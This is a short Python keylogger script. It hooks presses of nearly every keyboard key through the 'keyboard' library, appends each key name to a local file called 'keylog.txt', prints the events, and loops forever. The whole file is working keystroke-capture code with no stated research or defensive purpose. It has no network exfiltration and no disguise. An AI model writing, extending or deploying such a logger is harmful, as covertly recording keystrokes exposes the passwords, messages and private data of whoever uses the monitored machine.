import time
import keyboard

def logger(event):
    with open(r'keylog.txt', 'a') as keylog:
        keylog.write(event.name + '\n')
        print(event)
    # end with-as
# end logger()

keys = ['esc', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12', '`',
        '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '=', 'backspace', 'tab',
        'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\\', 'caps lock',
        'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ';', "'", 'enter', 'shift',
        'Z', 'X', 'C', 'V', 'B', 'N', 'M', ',', '.',
        'right shift', 'ctrl', 'left windows', 'alt', 'space', 'right alt', 'menu', 'right ctrl',
        'print screen', 'scroll lock', 'pause', 'insert', 'home', 'page up', 'delete', 'end', 'page down',
        'up', 'left', 'down', 'right', 'decimal', '+', '-', '*', '/', 'num lock'
]

for key in keys: keyboard.on_press_key(key, logger)

while True: time.sleep(1)
